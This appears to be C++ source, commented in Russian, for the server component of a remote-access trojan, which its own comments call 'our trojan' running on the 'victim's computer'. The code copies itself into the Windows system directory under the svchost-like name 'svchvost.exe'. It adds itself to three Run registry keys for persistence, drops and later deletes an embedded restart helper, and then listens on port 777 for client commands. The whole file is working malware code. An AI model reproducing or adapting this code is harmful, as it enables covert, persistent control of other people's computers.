#include <iostream>
#include <vector>
#include "server.h"
#include "commands.h"
#include "common.h"
#include "strlist.h"
#include "shlwapi.h"
#include "resource.h"

using namespace std;
using namespace PUSHKIN_SERVER;

#pragma warning (disable: 4996)

#pragma comment(lib, "shlwapi.lib")

// Поток, пытающийся удалить программу обновления сервера
DWORD WINAPI DeleteSU(LPVOID pParam)
{
   // Проверяем, существует ли файл
   if (!PathFileExists("su.exe")) return 0;

   // Сто раз попытаемся удалить этот файл (раз в пол секунды)
   while (1)
   {
      // Специально для Windows 98 мы запускаем эту процедуру много-много раз подряд чтоб убедиться, то все хорошо
      DeleteFile("su.exe");

      if (!PathFileExists("su.exe")) break;  // Если файла уже нет, то выходим из цикла

      Sleep(500);  // Будем пытаться это сделать каждую секунду
   }

   return 0;
}

// Функция, выгружающая на диск программу перезапуска сервера
int CreateSU(const char *path)
{
   // 1. Сначала выгружаем запускающую программу на диск
   HRSRC hRc = FindResource(NULL, MAKEINTRESOURCE(IDR_DATA1), RT_RCDATA);
   if (!hRc) return P_ERROR;

   HGLOBAL hRes = LoadResource(NULL, hRc );
   if (!hRes) return P_ERROR;

   LPVOID pData = LockResource(hRes);
   if (!pData) return P_ERROR;

   fpos_t *pos = (fpos_t*)pData;
   unsigned int size = (unsigned int)*pos;

   FILE *pFile = fopen(path, "wb");
   if (!pFile) return P_ERROR;

   // Записываем файл на диск
   if (fwrite((char*)pData+sizeof(fpos_t), 1, size, pFile) != size)
      return P_ERROR;

   fflush(pFile);
   fclose(pFile);

   return P_YES;
}

// Функция, регистрирующая сервер на компьютере жертвы (если он еще, конечно не зарегистрирован уже)
int RegisterServer(const char *path_exe, int &b_restart_server)
{
   b_restart_server = 0;

   char buf[1024];
   char new_server_path[1024];  // Новый рабочий каталог сервера
   if (!GetSystemDirectory(buf, 1024)) return P_ERROR;  // Ошибка при получении директория с системой

   // Создаем каталог для нашего трояна (на всякий случай ему понадобится отдельный каталог
   strcat(buf, "\\svchvost");
   if (!PathFileExists(buf))
      if (!CreateDirectory(buf, NULL)) return P_ERROR;

   strcpy(new_server_path, buf);

   strcat(buf, "\\svchvost.exe");

   // Если сервер был запущен не из папки SYSTEM32, то инициируем процедуру перезапуска сервера
   // перезапуск будет происходить сразу же
   if (strcmpi(path_exe, buf) != 0)
   {
      // Сначала пытаемся удалить старый сервер
      // Если за 10 попыток не удалось это сделать, то просто выходим (длительность - 2 секунды)
      int b_deleted = 0;
      for (int i=0; i<10; i++)
      {
         DeleteFile(buf);

         if (!PathFileExists(buf))
         {
            b_deleted = 1;
            break;
         }

         Sleep(200);  // Ждем
      }

      if (!b_deleted) return P_ERROR;  // Не удалось удалить себя из старого места - пытаемся открыть порт

      // Копируем себя туда (только тогда, когда сервер запущен из неправильного места)
      if (!CopyFile(path_exe, buf, FALSE)) return P_ERROR;

      b_restart_server = 1;  // А теперь сервер можно и перезапустить, если удалось скопировать себя на новое место
   }

   // Регистрируем программу
   HKEY key;

   // Первый ключ реестра
   if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &key) == ERROR_SUCCESS)
   {
      RegSetValueEx(key, "svchvost.p", 0, REG_SZ, (LPBYTE)buf, (DWORD)strlen(buf)+1);
      RegCloseKey(key);
   }

   // Второй ключ реестра
   if (RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &key) == ERROR_SUCCESS)
   {
      RegSetValueEx(key, "svchvost.p", 0, REG_SZ, (LPBYTE)buf, (DWORD)strlen(buf)+1);
      RegCloseKey(key);
   }

   // Третий ключ реестра
   if (RegOpenKey(HKEY_USERS, ".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", &key) == ERROR_SUCCESS)
   {
      RegSetValueEx(key, "svchvost.p", 0, REG_SZ, (LPBYTE)buf, (DWORD)strlen(buf)+1);
      RegCloseKey(key);
   }

   // Теперь все подготовлено для возможного перезапуска сервера - запускаем процесс перезапуска сервера
   if (b_restart_server)
   {
      // Выгружаем на диск программу перезапуска сервера - в место, откуда будет запускаться сервер
      if (CreateSU((String)new_server_path + "\\su.exe") != P_YES) return P_ERROR;

      // Запускаем программу из того места
      STARTUPINFO si;
      PROCESS_INFORMATION pi;

      ZeroMemory( &si, sizeof(si) );
      si.cb = sizeof(si);
      ZeroMemory( &pi, sizeof(pi) );

      // Запускаем программу обновления сервера
//      MessageBox(NULL, "Starting su.exe", "Fuck", MB_OK);
      String cmd_line = (String)new_server_path + "\\su.exe restart svchvost.exe";

      if( !CreateProcess( NULL, (LPSTR)(const char*)cmd_line, // Command line. 
                           NULL,             // Process handle not inheritable. 
                           NULL,             // Thread handle not inheritable. 
                           FALSE,            // Set handle inheritance to FALSE. 
                           0,                // No creation flags. 
                           NULL,             // Use parent's environment block. 
                           new_server_path,  // Запускаем его из места, где будет запущена новая версия
                           &si,              // Pointer to STARTUPINFO structure.
                           &pi ) )            // Pointer to PROCESS_INFORMATION structure.
      {
//         MessageBox(NULL, "Error starting su.exe!", "Fuck", MB_OK);
         return P_ERROR;
      }
   }

   return P_YES;
}

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
{
#else
int main()
{
   HINSTANCE hInst = NULL;  // Это для тестирования сервера в консольном режиме
#endif
   // Сразу после запуска сервера пытаемся удалить программу перезапуска сервера

#ifndef _DEBUG
   DWORD thread_id;
   HANDLE hThread = CreateThread(NULL, 0, DeleteSU, NULL, 0, &thread_id);

   char buf[1024];
   GetModuleFileName(hInst, buf, 1024);

   // Затем пытаемся записать себя в автозапуск (в пару разных мест)
   // (если надо, то сервер перезапускается из нового места) (прямо там)
   
   int b_restart_server = 0;
   RegisterServer(buf, b_restart_server);
   if (b_restart_server) return 0;  // Выходим из этого экземпляра сервера, если его надо перезапустить
#endif
   CPushkinServer serv;

   // Инициализируем сервер
   if (serv.Init(777) != P_YES)
   {
      cout << "Error starting server!" << endl;
      return 0;
   }

   // Запускаем цикл обработки клиентов
   if (serv.Run() != P_YES)
   {
      cout << "Error running server!" << endl;
      return 0;
   }
   
   return 0;
}
